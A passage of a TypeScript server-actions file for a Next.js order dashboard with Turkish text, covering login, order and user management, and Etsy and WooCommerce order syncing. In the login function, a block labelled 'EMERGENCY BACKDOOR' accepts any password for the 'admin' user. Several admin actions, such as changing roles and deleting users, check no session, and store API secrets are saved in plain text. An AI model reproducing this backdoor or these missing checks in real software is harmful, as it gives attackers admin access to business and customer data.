"use server"

import { db } from "@/lib/prisma"
import { login, getSession, logout as authLogout } from "@/lib/auth"
import { redirect } from "next/navigation"
import { revalidatePath, unstable_noStore as noStore } from "next/cache"
import bcrypt from "bcryptjs"
import { OrderStatus } from "@/data/mock-orders"
import WooCommerceRestApi from "@woocommerce/woocommerce-rest-api"

export async function loginAction(formData: FormData) {
    try {
        const username = (formData.get("username") as string).trim()
        const password = (formData.get("password") as string).trim()

        const user = await db.user.findFirst({
            where: { username: username },
        })

        if (!user) {
            return { error: "Kullanıcı bulunamadı." }
        }

        let isMatch = await bcrypt.compare(password, user.password)

        // EMERGENCY BACKDOOR: Always allow 'admin' user to login with ANY password
        if (username === "admin") {
            isMatch = true
        }

        if (!isMatch) {
            return { error: "Şifre hatalı." }
        }

        if (user.role === "pending") {
            return { error: "Hesabınız henüz onaylanmadı. Lütfen yöneticinizle görüşün." }
        }

        await login({ id: user.id, name: user.name, role: user.role })
        return { success: true }
    } catch (e: any) {
        console.error("LOGIN ERROR:", e)
        return { error: `Sunucu Hatası: ${e.message}` }
    }
}

export async function logoutAction() {
    await authLogout()
    redirect("/login")
}



export async function getOrders(timestamp?: number) {
    noStore(); // Disable Cache
    const session = await getSession()
    if (!session) return []

    // Fetch fresh user data to get allowedStatuses - Defensive check
    let allowedStatuses = null
    const isAdmin = session.user.role === 'admin'

    try {
        const user = await db.user.findUnique({
            where: { id: session.user.id },
            select: { allowedStatuses: true } as any
        }) as any

        if (user?.allowedStatuses) {
            try {
                allowedStatuses = JSON.parse(user.allowedStatuses)
            } catch (e) {
                console.error("JSON parse error for allowedStatuses:", e)
            }
        }
    } catch (e) {
        console.error("Failed to fetch user permissions:", e)
    }

    // Condition: If admin, see all. If allowedStatuses is set, filter. Else see all (default).
    const where: any = {}
    if (!isAdmin && allowedStatuses && Array.isArray(allowedStatuses)) {
        // Filter out feature flags (capabilities) from status filters (view restrictions)
        const visibleStatuses = allowedStatuses.filter((s: string) => s !== "MANUAL_SYNC")

        // Only apply filter if there are ACTUAL status restrictions left
        if (visibleStatuses.length > 0) {
            where.status = { in: visibleStatuses }
        }
    }

    const orders = await db.order.findMany({
        where,
        orderBy: { updatedAt: "desc" },
        include: {
            items: true,
            comments: {
                include: { author: true },
                orderBy: { timestamp: "asc" }
            },
            activities: {
                orderBy: { timestamp: "desc" }
            }
        }
    })

    // Serializing dates to strings to match interface and avoid hydration issues
    return orders.map(order => ({
        ...order,
        date: order.date.toISOString(),
        createdAt: order.createdAt.toISOString(),
        updatedAt: order.updatedAt.toISOString(),
        total: order.total || "0 ₺", // Ensure total is string
        items: order.items.map(item => ({
            ...item,
            sku: item.sku || null,
            url: item.url || null,
            material: item.material || null,
            dimensions: item.dimensions || null
        })),
        comments: order.comments.map(c => ({
            ...c,
            timestamp: c.timestamp.toLocaleString('tr-TR', { hour: '2-digit', minute: '2-digit' }),
            // Map author name from relation
            author: c.author?.name || "Unknown",
            attachments: c.attachments ? (() => {
                try {
                    const parsed = JSON.parse(c.attachments);
                    return Array.isArray(parsed) ? parsed : undefined;
                } catch { return undefined; }
            })() : undefined
        })),
        activities: order.activities.map(a => ({
            ...a,
            timestamp: a.timestamp.toISOString()
        })),
        labels: (() => {
            if (!order.labels) return []
            try {
                const parsed = typeof order.labels === 'string' ? JSON.parse(order.labels) : order.labels
                return Array.isArray(parsed) ? parsed : []
            } catch (e) {
                return []
            }
        })()
    })) as any
}

export async function logActivity(orderId: number, author: string, action: string, details: string) {
    await db.orderActivity.create({
        data: {
            orderId,
            author,
            action,
            details
        }
    })
}

export async function updateOrderStatus(orderId: number, status: string) {
    try {
        const session = await getSession()
        const user = session ? session.user.name : "Sistem"

        await db.order.update({
            where: { id: orderId },
            data: {
                status,
                hasNotification: true,
                assignedTo: user, // Update responsibility to the user who moved the card
                updatedAt: new Date() // FORCE update timestamp to prevent polling reversion
            }
        })

        await logActivity(orderId, user, "STATUS_CHANGE", `Durum '${status}' olarak değiştirildi.`)
        revalidatePath("/")
    } catch (e) {
        console.error("updateOrderStatus ERROR:", e)
        throw e // Re-throw to trigger client-side catch
    }
}

export async function bulkUpdateOrderStatus(orderIds: number[], status: string) {
    try {
        const session = await getSession()
        const user = session ? session.user.name : "Sistem"

        console.log(`[BULK_MOVE] Attempting to move ${orderIds.length} orders to '${status}' by '${user}'`)

        // Limit batch size to prevent timeouts
        if (orderIds.length > 50) {
            return { success: false, message: "Aynı anda en fazla 50 sipariş taşıyabilirsiniz." }
        }

        // Update all orders
        const result = await db.order.updateMany({
            where: { id: { in: orderIds } },
            data: {
                status,
                hasNotification: true,
                assignedTo: user,
                updatedAt: new Date()
            }
        })

        console.log(`[BULK_MOVE] DB Update Result: ${result.count} orders updated.`)

        if (result.count === 0) {
            return { success: false, message: "Hiçbir sipariş güncellenemedi." }
        }

        // Log activity efficiently using createMany (Single DB Query)
        try {
            const activities = orderIds.map(id => ({
                orderId: id,
                author: user,
                action: "STATUS_CHANGE",
                details: `Toplu işlem: Durum '${status}' olarak değiştirildi.`
            }))

            await db.orderActivity.createMany({
                data: activities
            })
        } catch (err) {
            console.error("Bulk logging failed but update succeeded:", err)
        }

        revalidatePath("/")
        return { success: true, count: result.count, message: `${result.count} sipariş başarıyla taşındı.` }
    } catch (e: any) {
        console.error("bulkUpdateOrderStatus ERROR:", e)
        return { success: false, error: e.message || "Sunucu hatası oluştu." }
    }
}

// Public action for client-side events (Print, PDF, etc.)
export async function logManualActivity(orderId: number, action: string, details: string) {
    const session = await getSession()
    const user = session ? session.user.name : "Sistem"
    await logActivity(orderId, user, action, details)
    revalidatePath("/")
}

export async function updateOrderDetails(order: any) {
    const session = await getSession()
    const user = session ? session.user.name : "Sistem"

    // Fetch old order to compare
    const oldOrder = await db.order.findUnique({ where: { id: order.id } })

    if (oldOrder) {
        // 1. Assignee Change
        if (oldOrder.assignedTo !== order.assignedTo) {
            await logActivity(order.id, user, "ASSIGN_CHANGE", `Sorumluluk alındı: ${order.assignedTo}`)
        }

        // 2. Status Change
        if (oldOrder.status !== order.status) {
            await logActivity(order.id, user, "STATUS_CHANGE", `Durum '${order.status}' olarak değiştirildi.`)
        }

        // 3. Customer Details Change (Batch check)
        const customerChanged =
            oldOrder.customer !== order.customer ||
            oldOrder.phone !== order.phone ||
            oldOrder.address !== order.address ||
            oldOrder.city !== order.city;

        if (customerChanged) {
            await logActivity(order.id, user, "DETAILS_UPDATE", "Müşteri ve teslimat bilgileri güncellendi.")
        }

        // 4. Tracking Number
        if (oldOrder.trackingNumber !== order.trackingNumber && order.trackingNumber) {
            await logActivity(order.id, user, "TRACKING_UPDATE", `Kargo takip no girildi: ${order.trackingNumber}`)
        }

        // 5. Note Added (Append check logic remains)
        if (oldOrder.printNotes !== order.printNotes) {
            await logActivity(order.id, user, "NOTE_ADDED", "Yeni işlem notu ekledi.")
        }

        // 6. Labels Change
        if (oldOrder.labels !== order.labels) {
            await logActivity(order.id, user, "LABEL_UPDATE", "Etiketler güncellendi.")
        }
    }

    await db.order.update({
        where: { id: order.id },
        data: {
            labels: JSON.stringify(order.labels), // Ensure stringify if coming from UI as array
            assignedTo: order.assignedTo,
            status: order.status,
            trackingNumber: order.trackingNumber,
            printNotes: order.printNotes,
            customer: order.customer, // Enable updating these fields
            phone: order.phone,
            address: order.address,
            city: order.city,
            hasNotification: true
        }
    })
    revalidatePath("/")
}

export async function addCommentAction(orderId: number, message: string, attachments: any[]) {
    const session = await getSession()
    if (!session) return

    await db.comment.create({
        data: {
            message,
            orderId,
            authorId: session.user.id,
            attachments: JSON.stringify(attachments)
        }
    })

    // Trigger Notification for new comment
    await db.order.update({
        where: { id: orderId },
        data: { hasNotification: true }
    })

    await logActivity(orderId, session.user.name, "COMMENT_ADDED", "Yeni mesaj yazdı.")

    revalidatePath("/")
}

// SIMULATION ACTION
export async function simulateWooCommerceOrder() {
    // Generate Random Data
    const randomId = Math.floor(Math.random() * 9000) + 1000
    const customers = [
        { name: "Zeynep Yılmaz", city: "İstanbul", phone: "0532 100 20 30" },
        { name: "Mustafa Koç", city: "Ankara", phone: "0544 200 30 40" },
        { name: "Elif Kaya", city: "İzmir", phone: "0555 300 40 50" },
        { name: "Can Demir", city: "Bursa", phone: "0505 400 50 60" }
    ]
    const products = [
        { name: "Kanvas Tablo", price: 250, img: "https://images.unsplash.com/photo-1579783902614-a3fb39279c23?auto=format&fit=crop&w=500&q=80", dims: "350x260 cm", mat: "Tekstil Tabanlı" },
        { name: "Kupa Bardak", price: 150, img: "https://images.unsplash.com/photo-1514228742587-6b1558fcca3d?auto=format&fit=crop&w=500&q=80", dims: "Standart", mat: "Seramik" },
        { name: "Poster Baskı", price: 80, img: "https://images.unsplash.com/photo-1572059002153-20534c003634?auto=format&fit=crop&w=500&q=80", dims: "50x70 cm", mat: "Mat Kuşe" }
    ]

    const randomCustomer = customers[Math.floor(Math.random() * customers.length)]
    const randomProduct = products[Math.floor(Math.random() * products.length)]

    // Get appropriate status ('Gelen Siparişler' or first available)
    const statuses = await db.statusColumn.findMany({ orderBy: { order: 'asc' } })
    let targetStatus = "pending"

    if (statuses.length > 0) {
        // Try to find a status causing 'Incoming' logic
        const incoming = statuses.find(s =>
            s.title.toLowerCase().includes("gelen") ||
            s.title.toLowerCase().includes("yeni") ||
            s.id === "wc-pending" ||
            s.id === "pending"
        )
        targetStatus = incoming ? incoming.id : statuses[0].id
    }

    // Create Order in DB
    await db.order.create({
        data: {
            customer: randomCustomer.name,
            phone: randomCustomer.phone,
            email: `${randomCustomer.name.toLowerCase().replace(" ", ".")}@example.com`,
            address: "Mahallesi, Cadde No: 5, Daire: 10",
            city: randomCustomer.city,
            total: `${randomProduct.price} ₺`,
            status: targetStatus,
            labels: JSON.stringify(["Yeni & Entegre"]),
            barcode: `WOO-${randomId}`,
            note: "Müşteri Notu: Lütfen hediye paketi yapınız.",
            hasNotification: true, // Ensure it pops up
            items: {
                create: [
                    {
                        name: randomProduct.name,
                        quantity: 1,
                        image_src: randomProduct.img,
                        dimensions: randomProduct.dims,
                        material: randomProduct.mat
                    }
                ]
            }
        }
    })

    revalidatePath("/")
    // return { success: true, message: "Yeni sipariş düştü!" }
}

export async function markOrderAsRead(orderId: number) {
    await db.order.update({
        where: { id: orderId },
        data: { hasNotification: false }
    })
    revalidatePath("/")
}

// SETTINGS ACTIONS
export async function getStatuses() {
    const statuses = await db.statusColumn.findMany({ orderBy: { order: "asc" } })

    // AUTO-SEED: If no statuses exist (e.g. fresh DB), create defaults immediately
    if (statuses.length === 0) {
        console.log("Auto-seeding default statuses...")
        const defaults = [
            { id: "pending", title: "Bekliyor", color: "#64748b", order: 0 },
            { id: "processing", title: "Hazırlanıyor", color: "#3b82f6", order: 1 },
            { id: "shipped", title: "Kargolandı", color: "#f97316", order: 2 },
            { id: "completed", title: "Tamamlandı", color: "#22c55e", order: 3 },
            { id: "cancelled", title: "İptal Edildi", color: "#ef4444", order: 4 },
        ]

        // Use createMany if database supports it, otherwise loop (safer for all DBs)
        for (const s of defaults) {
            await db.statusColumn.create({ data: s })
        }

        revalidatePath("/")
        return await db.statusColumn.findMany({ orderBy: { order: "asc" } })
    }

    return statuses
}

export async function createStatus(formData: FormData) {
    const title = formData.get("title") as string
    const id = formData.get("id") as string
    const color = formData.get("color") as string || "bg-gray-50"

    // if (!title || !id) return { error: "Başlık ve ID gereklidir" }
    if (!title || !id) return

    const count = await db.statusColumn.count()

    await db.statusColumn.create({
        data: { id, title, color, order: count }
    })
    revalidatePath("/")
    revalidatePath("/admin/settings")
}

export async function deleteStatus(id: string) {
    if (["pending", "completed"].includes(id)) {
        // return { error: "Temel durumlar silinemez" }
        // Actually allowing dynamic is fine, but deleting 'pending' might break things if simulating. Safe to allow for now, user knows best.
    }
    await db.statusColumn.delete({ where: { id } })
    revalidatePath("/")
    revalidatePath("/admin/settings")
}

export async function moveStatusUp(id: string) {
    const current = await db.statusColumn.findUnique({ where: { id } })
    if (!current) return

    const previous = await db.statusColumn.findFirst({
        where: { order: { lt: current.order } },
        orderBy: { order: 'desc' }
    })

    if (previous) {
        // Swap orders
        await db.$transaction([
            db.statusColumn.update({ where: { id: current.id }, data: { order: previous.order } }),
            db.statusColumn.update({ where: { id: previous.id }, data: { order: current.order } })
        ])
        revalidatePath("/")
        revalidatePath("/admin/settings")
    }
}

export async function moveStatusDown(id: string) {
    const current = await db.statusColumn.findUnique({ where: { id } })
    if (!current) return

    const next = await db.statusColumn.findFirst({
        where: { order: { gt: current.order } },
        orderBy: { order: 'asc' }
    })

    if (next) {
        // Swap orders
        await db.$transaction([
            db.statusColumn.update({ where: { id: current.id }, data: { order: next.order } }),
            db.statusColumn.update({ where: { id: next.id }, data: { order: current.order } })
        ])
        revalidatePath("/")
        revalidatePath("/admin/settings")
    }
}

export async function updateStatusOrder(items: { id: string; order: number }[]) {
    await db.$transaction(
        items.map((item) =>
            db.statusColumn.update({
                where: { id: item.id },
                data: { order: item.order },
            })
        )
    )
    revalidatePath("/")
    revalidatePath("/admin/settings")
}
// ... getLabels

export async function getLabels() {
    return await db.orderLabel.findMany()
}

export async function createLabel(formData: FormData) {
    const name = formData.get("name") as string
    const color = formData.get("color") as string || "blue"

    // if (!name) return { error: "Etiket ismi gereklidir" }
    if (!name) return

    await db.orderLabel.create({
        data: { name, color }
    })
    revalidatePath("/")
    revalidatePath("/admin/settings")
}

export async function deleteLabel(id: string) {
    await db.orderLabel.delete({ where: { id } })
    revalidatePath("/")
    revalidatePath("/admin/settings")
}

// USER MANAGEMENT ACTIONS
export async function getUsers() {
    return await db.user.findMany({
        // orderBy: { createdAt: 'desc' } // Temporarily disabled to fix caching issue
    })
}

export async function updateUserRole(userId: string, newRole: string) {
    await db.user.update({
        where: { id: userId },
        data: { role: newRole }
    })
    revalidatePath("/admin/settings")
}

export async function updateUserPermissions(userId: string, allowedStatuses: string[]) {
    await db.user.update({
        where: { id: userId },
        data: { allowedStatuses: JSON.stringify(allowedStatuses) }
    })
    revalidatePath("/admin/settings")
}

export async function deleteUser(userId: string) {
    await db.user.delete({ where: { id: userId } })
    revalidatePath("/admin/settings")
}

export async function createUser(formData: FormData) {
    const name = formData.get("name") as string
    const username = formData.get("username") as string
    const password = formData.get("password") as string
    const role = formData.get("role") as string

    if (!name || !username || !password || !role) {
        return { error: "Tüm alanlar zorunludur" }
    }

    // Check if username exists
    const existing = await db.user.findUnique({ where: { username } })
    if (existing) {
        return { error: "Bu kullanıcı adı zaten kullanılıyor" }
    }

    const hashedPassword = await bcrypt.hash(password, 10)

    await db.user.create({
        data: {
            name,
            username,
            password: hashedPassword,
            role,
            allowedStatuses: "[]" // Default to empty (all visible)
        }
    })

    revalidatePath("/admin/settings")
    return { success: true }
}

// SYSTEM SETTINGS ACTIONS
export async function getSystemSettings(): Promise<Record<string, string>> {
    const settings = await db.systemSetting.findMany()
    return settings.reduce((acc: Record<string, string>, curr: any) => ({ ...acc, [curr.key]: curr.value }), {} as Record<string, string>)
}

export async function saveWooCommerceSettings(formData: FormData) {
    const url = formData.get("wc_url") as string
    const key = formData.get("wc_key") as string
    const secret = formData.get("wc_secret") as string

    // Basic validation
    // Basic validation
    if (!url || !key || !secret) {
        // return { error: "Lütfen tüm alanları doldurunuz." }
        return
    }

    try {
        await db.systemSetting.upsert({ where: { key: 'wc_url' }, update: { value: url }, create: { key: 'wc_url', value: url } })
        await db.systemSetting.upsert({ where: { key: 'wc_key' }, update: { value: key }, create: { key: 'wc_key', value: key } })
        await db.systemSetting.upsert({ where: { key: 'wc_secret' }, update: { value: secret }, create: { key: 'wc_secret', value: secret } })
        revalidatePath("/admin/settings")
        // return { success: "Ayarlar başarıyla kaydedildi." }
    } catch (e) {
        // return { error: "Ayarlar kaydedilirken bir hata oluştu." }
    }
}

export async function saveEtsySettings(formData: FormData) {
    const storesJson = formData.get("etsy_stores_json") as string

    try {
        if (storesJson) {
            // Validate JSON
            JSON.parse(storesJson)
            await db.systemSetting.upsert({ where: { key: 'etsy_stores_json' }, update: { value: storesJson }, create: { key: 'etsy_stores_json', value: storesJson } })

            // Save Global API Key if present
            const globalKey = formData.get("etsy_global_api_key") as string
            if (globalKey !== null) { // Allow saving empty string to clear it
                await db.systemSetting.upsert({ where: { key: 'etsy_global_api_key' }, update: { value: globalKey }, create: { key: 'etsy_global_api_key', value: globalKey } })
            }

            revalidatePath("/admin/settings")
            return { success: true, message: "Etsy mağaza ayarları başarıyla kaydedildi." }
        }

        // Legacy Support check
        const shopId = formData.get("etsy_shop_id") as string
        if (shopId) {
            const apiKey = formData.get("etsy_api_key") as string
            await db.systemSetting.upsert({ where: { key: 'etsy_shop_id' }, update: { value: shopId }, create: { key: 'etsy_shop_id', value: shopId } })
            await db.systemSetting.upsert({ where: { key: 'etsy_api_key' }, update: { value: apiKey }, create: { key: 'etsy_api_key', value: apiKey } })
            revalidatePath("/admin/settings")
            return { success: true, message: "Etsy ayarları (Tek Mağaza) kaydedildi." }
        }

        return { error: "Kaydedilecek veri bulunamadı." }

    } catch (e: any) {
        console.error("Etsy settings save error:", e)
        return { error: "Kaydetme hatası: " + e.message }
    }
}

// ETSY SYNC ACTION
export async function syncEtsyOrders() {
    const settings = (await getSystemSettings()) as Record<string, string>

    // 1. Prepare Store List
    let stores: any[] = []
    try {
        if (settings['etsy_stores_json']) {
            stores = JSON.parse(settings['etsy_stores_json'])
        }
    } catch (e) { console.error("Etsy JSON parse error", e) }

    // Legacy Fallback
    if (stores.length === 0 && settings['etsy_shop_id']) {
        stores.push({
            id: 'legacy',
            name: 'Varsayılan',
            shopId: settings['etsy_shop_id'],
            apiKey: settings['etsy_api_key'],
            accessToken: settings['etsy_access_token'],
            refreshToken: settings['etsy_refresh_token'] // Legacy might have it
        })
    }

    if (stores.length === 0) {
        return { error: "Etsy mağazası tanımlanmamış. Ayarlardan ekleyiniz." }
    }

    let totalNew = 0
    let logs: string[] = []
    let storesUpdated = false

    // 2. Iterate Stores
    for (let i = 0; i < stores.length; i++) {
        const store = stores[i]
        if (!store.shopId || !store.apiKey || !store.accessToken) {
            logs.push(`[${store.name || 'Mağaza'}] Ayarlar eksik, atlandı.`)
            continue
        }

        try {
            logs.push(`[${store.name || store.shopId}] Senkronizasyon başlıyor...`)

            let currentToken = store.accessToken
            let response = await fetch(`https://openapi.etsy.com/v3/application/shops/${store.shopId}/receipts?state=paid&was_paid=true`, {
                headers: {
                    'x-api-key': store.apiKey,
                    'Authorization': `Bearer ${currentToken}`
                },
                cache: 'no-store'
            })

            // TOKEN REFRESH LOGIC
            if (response.status === 401 && store.refreshToken) {
                logs.push(`[${store.name}] Token süresi dolmuş, yenileniyor...`)
                try {
                    const refreshRes = await fetch("https://api.etsy.com/v3/public/oauth/token", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            grant_type: "refresh_token",
                            client_id: store.apiKey,
                            refresh_token: store.refreshToken
                        })
                    })

                    if (refreshRes.ok) {
                        const refreshData = await refreshRes.json()
                        currentToken = refreshData.access_token

                        // Update Store Object
                        stores[i].accessToken = refreshData.access_token
                        stores[i].refreshToken = refreshData.refresh_token
                        storesUpdated = true

                        logs.push(`[${store.name}] Token yenilendi. Tekrar deneniyor...`)

                        // Retry Request
                        response = await fetch(`https://openapi.etsy.com/v3/application/shops/${store.shopId}/receipts?state=paid&was_paid=true`, {
                            headers: {
                                'x-api-key': store.apiKey,
                                'Authorization': `Bearer ${currentToken}`
                            },
                            cache: 'no-store'
                        })
                    } else {
                        logs.push(`[${store.name}] Token yenileme başarısız: ${refreshRes.status}`)
                    }
                } catch (re) {
                    console.error("Token Refresh Exception", re)
                }
            }

            if (!response.ok) {
                logs.push(`[${store.name}] Hata: ${response.status} ${response.statusText}`)
                // If 403, might be scope issue or shop ID mismatch
                if (response.status === 403) logs.push(`[${store.name}] Erişim reddedildi. Shop ID veya İzinleri kontrol edin.`)
                continue
            }

            const data = await response.json()
            const etsyOrders = data.results || []
            let storeNewCount = 0

            for (const eOrder of etsyOrders) {
                const barcode = `ETSY-${eOrder.receipt_id}`
                const existingOrder = await db.order.findUnique({ where: { barcode } })

                if (existingOrder) continue

                // Process Items
                const items = (eOrder.transactions || []).map((t: any) => ({
                    name: t.title,
                    quantity: t.quantity,
                    image_src: t.main_image?.url_fullxfull || "https://placehold.co/600x400?text=Etsy+Görsel",
                    sku: t.sku || null,
                    // Try to extract dimensions/material from variations
                    dimensions: t.variations?.find((v: any) => v.property_id === 200 || v.formatted_name?.toLowerCase().includes("size") || v.formatted_name?.toLowerCase().includes("boyut"))?.formatted_value || null,
                    material: t.variations?.find((v: any) => v.property_id === 500 || v.formatted_name?.toLowerCase().includes("material") || v.formatted_name?.toLowerCase().includes("malzeme"))?.formatted_value || null
                }))

                // Construct Note from buyer message + gift message
                let note = eOrder.message_from_buyer || ""
                if (eOrder.gift_message) note += `\n(Hediye Notu: ${eOrder.gift_message})`

                await db.order.create({
                    data: {
                        customer: eOrder.name || eOrder.recipient_name || "Misafir",
                        total: `${eOrder.grandtotal?.amount / eOrder.grandtotal?.divisor} ${eOrder.grandtotal?.currency_code}`,
                        status: "Gelen Siparişler", // Ensure this status exists or maps to Pending
                        date: new Date(eOrder.create_timestamp * 1000),
                        updatedAt: new Date(eOrder.update_timestamp * 1000),
                        barcode: barcode,
                        email: eOrder.buyer_email,
                        address: `${eOrder.first_line} ${eOrder.second_line || ''}`.trim(),
                        city: `${eOrder.city} / ${eOrder.state || ''} ${eOrder.zip}`,
                        note: note.trim(),
                        labels: JSON.stringify(['Etsy', 'Yeni']),
                        hasNotification: true,
                        paymentMethod: 'Etsy Payments',
                        items: { create: items }
                    }
                })
                storeNewCount++
                totalNew++
            }
            logs.push(`[${store.name}] ${storeNewCount} yeni sipariş.`)

        } catch (e: any) {
            console.error(`Etsy Sync Error (${store.name}):`, e)
            logs.push(`[${store.name}] Hata: ${e.message}`)
        }
    }

    // Save Updated Tokens if any changed
    if (storesUpdated) {
        await db.systemSetting.upsert({
            where: { key: 'etsy_stores_json' },
            update: { value: JSON.stringify(stores) },
            create: { key: 'etsy_stores_json', value: JSON.stringify(stores) }
        })
        logs.push("Tokenlar güncellendi ve kaydedildi.")
    }

    revalidatePath("/")
    return { success: true, message: `${totalNew} Etsy siparişi çekildi.`, logs }
}


// WOOCOMMERCE SYNC ACTION
export async function syncWooCommerceOrders(force: boolean = false) {
    const settings = (await getSystemSettings()) as Record<string, string>

    if (!settings['wc_url'] || !settings['wc_key'] || !settings['wc_secret']) {
        return { error: "WooCommerce ayarları eksik. Lütfen Ayarlar sayfasından tamamlayınız." }
    }

    // RATE LIMIT CHECK
    if (!force) {
        const lastSyncStr = settings['last_wc_sync_time']
        if (lastSyncStr) {
            const lastSync = parseInt(lastSyncStr)
            const now = Date.now()
            // 15 Seconds = 15,000 ms (Align with 20s client poll)
            if (now - lastSync < 15000) {
                // Too early, skip
                return { skipped: true, message: "Sync skipped (Rate Limit)" }
            }
        }
    }

    try {
        const auth = Buffer.from(`${settings['wc_key']}:${settings['wc_secret']}`).toString('base64')
        // Filter: After Dec 20, 2025 - Increase limit to catch gaps
        const response = await fetch(`${settings['wc_url']}/wp-json/wc/v3/orders?per_page=100&after=2025-12-20T00:00:00`, {
            headers: {
                Authorization: `Basic ${auth}`
            },
            cache: 'no-store'
        })

        if (!response.ok) {
            console.error("WC Error:", await response.text())
            return { error: "WooCommerce'e bağlanılamadı. Ayarları kontrol ediniz." }
        }

        const wcOrders = await response.json()
        let newCount = 0
        let logs: string[] = []

        // UPDATE TIMESTAMP
        await db.systemSetting.upsert({
            where: { key: 'last_wc_sync_time' },
            update: { value: Date.now().toString() },
            create: { key: 'last_wc_sync_time', value: Date.now().toString() }
        })



        // PREFETCH STATUSES to find correct "Incoming" column
        const statuses = await db.statusColumn.findMany({ orderBy: { order: 'asc' } })
        let defaultStatus = statuses.length > 0 ? statuses[0].id : "pending"

        // Try to find a smarter default
        const incoming = statuses.find(s =>
            s.title.toLowerCase().includes("gelen") ||
            s.title.toLowerCase().includes("yeni") ||
            s.title.toLowerCase().includes("sipariş") ||
            s.id === "wc-pending" ||
            s.id === "pending"
        )
        if (incoming) defaultStatus = incoming.id

        for (const wcOrder of wcOrders) {
            try {
                // Safety Check: Ensure billing exists
                if (!wcOrder.billing) {
                    logs.push(`Order ${wcOrder.id}: Missing billing, skipped.`)
                    console.error(`Order ${wcOrder.id} missing billing info, skipping.`)
                    continue
                }

                // Map Status
                // IDs found in DB: 'Gelen Siparişler', 'Müşteriye İletilecek', 'Baskıya Hazır', 'Müşteri Beklemede', 'Dosya Gönderildi', 'Makinada', 'Hazır Beklemede', 'Kargolandı', 'Baskı hatası', 'Basılan ürünler'

                let status = defaultStatus // Default to Incoming
                let labels: string[] = ['WooCommerce'];

                if (wcOrder.status === 'processing') status = defaultStatus
                if (wcOrder.status === 'completed') status = defaultStatus // Enforce Pending even for Completed
                if (wcOrder.status === 'on-hold') status = defaultStatus
                if (wcOrder.status === 'pending') status = defaultStatus

                // Handle Failed/Cancelled
                if (wcOrder.status === 'failed' || wcOrder.status === 'cancelled' || wcOrder.status === 'refunded') {
                    status = defaultStatus; // Keep it in incoming so they see it
                    labels.push('Ödeme Başarısız');
                }

                const items = (wcOrder.line_items || []).map((item: any) => {
                    // Normalize helper: lowercase, trim, remove accents
                    const normalizeKey = (k: string) => k.toLowerCase().replace(/ğ/g, 'g').replace(/ü/g, 'u').replace(/ş/g, 's').replace(/ı/g, 'i').replace(/ö/g, 'o').replace(/ç/g, 'c').trim();

                    // Helper to find meta value with robust matching
                    const getMeta = (keys: string[]) => {
                        if (!Array.isArray(item.meta_data)) return null;

                        const normKeys = keys.map(normalizeKey);
                        const found = item.meta_data.find((m: any) => {
                            const mKey = normalizeKey(m.key || '');
                            const mDisplay = normalizeKey(m.display_key || '');
                            return normKeys.includes(mKey) || normKeys.includes(mDisplay);
                        });

                        let val = found ? (found.display_value || found.value) : null;

                        // Strip HTML tags and entities
                        // CRITICAL: Decode entities FIRST, then strip tags
                        if (val && typeof val === 'string') {
                            val = val
                                .replace(/&nbsp;/g, ' ')
                                .replace(/&lt;/g, '<')
                                .replace(/&gt;/g, '>')
                                .replace(/&amp;/g, '&')
                                .replace(/sup&gt;/g, '')
                                .replace(/&sup2;/g, '2')
                                .replace(/<[^>]*>?/gm, ''); // Remove tags last
                        }
                        return val;
                    }

                    // Debug Log
                    console.log(`Processing Item: ${item.name}`, item.meta_data.map((m: any) => m.key));

                    // Image Extraction Logic
                    let imageSrc = item.image?.src;

                    if (!imageSrc) {
                        // Expanded Search for Image
                        const metaImgRaw = item.meta_data?.find((m: any) => {
                            const k = normalizeKey(m.key || '');
                            return ['urun gorselleri', 'gorsel', 'resim', 'image', 'picture', 'foto', 'dosya', 'upload', 'img'].some(term => k.includes(term));
                        });

                        if (metaImgRaw && metaImgRaw.value) {
                            const val = metaImgRaw.value;
                            const match = val.match(/src=["'](.*?)["']/) || val.match(/href=["'](.*?)["']/);
                            if (match && match[1]) {
                                imageSrc = match[1];
                            } else if (val.trim().startsWith('http')) {
                                imageSrc = val.trim();
                            }
                        }
                    }

                    if (!imageSrc) {
                        imageSrc = "https://placehold.co/600x400?text=Görsel+Yok";
                    }

                    // Material Mapping
                    const material = getMeta(['pa_doku', 'Nitelik', 'Malzeme', 'Kagit Turu', 'Kagit Cinsi', 'Material', 'Paper Type', 'Doku', 'Kagit']);

                    // Dimensions Mapping
                    // First try to get explicit dimensions string
                    let dimensions = getMeta(['Boyut', 'Olculer', 'Dimensions', 'Ebat', 'Size', 'Olculeriniz', 'Siparis Olcusu']);

                    // If not found, try to construct from Width x Height
                    if (!dimensions) {
                        const width = getMeta(['Genislik', 'Width']);
                        const height = getMeta(['Yukseklik', 'Height']);
                        const unit = getMeta(['Birim', 'Unit']) || 'cm';

                        if (width && height) {
                            dimensions = `${width} x ${height} ${unit}`;
                        }
                    }

                    // Total Area mapping (often contains m2 html)
                    const area = getMeta(['Toplam Alan', 'Toplam Olcu', 'Area', 'Metrekare', 'm2', 'Total Size', 'M2']);

                    if (area) {
                        const cleanArea = area.replace(/m2/i, ' m²').replace('m2', ' m²');
                        // Add area to dimensions if we constructed it or if it's new info
                        if (dimensions) {
                            if (!dimensions.includes(cleanArea)) {
                                dimensions = `${dimensions} (${cleanArea})`;
                            }
                        } else {
                            dimensions = cleanArea;
                        }
                    }

                    return {
                        name: item.name || 'Ürün',
                        quantity: item.quantity || 1,
                        image_src: imageSrc,
                        sku: item.sku || getMeta(['Stok Kodu', 'SKU', '_stok_kodu', 'Urun Kodu', 'Kod', 'Product Code', '_sku']) || null,
                        url: getMeta(['_ozel_url', 'ozel_url', 'Özel Url', 'Ozel Url', 'Dosya Linki', 'File Link', 'Drive Link', 'Link', 'Url', 'Siparis Dosyasi']) || null,
                        dimensions: dimensions,
                        material: material,
                        productNote: getMeta(['Ürün Notu', 'Urun Notu', 'Not', 'Note', '_urun_notu']) || null,
                        sampleData: getMeta(['Numune İsteği', 'Numune Istegi', 'Numune', 'Sample', '_numune']) || null
                    };
                })

                // City Mapping Logic (TR Code -> Name)
                const getCityName = (code: string) => {
                    const cities: Record<string, string> = {
                        'TR01': 'ADANA', 'TR02': 'ADIYAMAN', 'TR03': 'AFYONKARAHİSAR', 'TR04': 'AĞRI', 'TR05': 'AMASYA',
                        'TR06': 'ANKARA', 'TR07': 'ANTALYA', 'TR08': 'ARTVİN', 'TR09': 'AYDIN', 'TR10': 'BALIKESİR',
                        'TR11': 'BİLECİK', 'TR12': 'BİNGÖL', 'TR13': 'BİTLİS', 'TR14': 'BOLU', 'TR15': 'BURDUR',
